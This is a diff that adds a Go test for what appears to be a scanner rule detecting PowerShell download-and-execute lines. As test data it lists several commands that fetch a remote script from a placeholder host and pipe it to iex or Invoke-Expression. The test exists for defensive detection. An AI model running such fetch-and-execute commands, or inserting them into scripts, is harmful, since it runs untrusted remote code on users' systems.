@@ -467,3 +467,32 @@ func TestGL011_WrappedPipeToShell(t *testing.T) {
 		}
 	}
 }
+
+// The PowerShell checks run only on lines with iex or Invoke-Expression; every
+// line psPipeExecRe matches has one, in any case (#1336).
+func TestPowerShellExecGate(t *testing.T) {
+	for _, line := range []string{
+		"iwr https://x/i.ps1 | iex",
+		"IWR https://x/i.ps1 | IEX",
+		"irm https://x/i.ps1 | Select-Object -First 1 | Invoke-Expression",
+		"Invoke-WebRequest https://x/i.ps1 | INVOKE-EXPRESSION",
+		`pwsh -c "curl https://x/i.ps1 | iex"`,
+		"iex (irm https://x/i.ps1)",
+		"Iex ((New-Object Net.WebClient).DownloadString('https://x/i.ps1'))",
+	} {
+		if !psArgExecRe.possible(line) {
+			t.Errorf("%q: gate skips a PowerShell download-execute line", line)
+		}
+		if !isDownloadExecute(line) {
+			t.Errorf("%q: not reported", line)
+		}
+	}
+	for _, line := range []string{
+		"curl -fsSL https://x/app.tgz -o app.tgz",
+		"wget -q https://x/app.tgz",
+	} {
+		if psArgExecRe.possible(line) {
+			t.Errorf("%q: gate lets a line without iex through", line)
+		}
+	}
+}
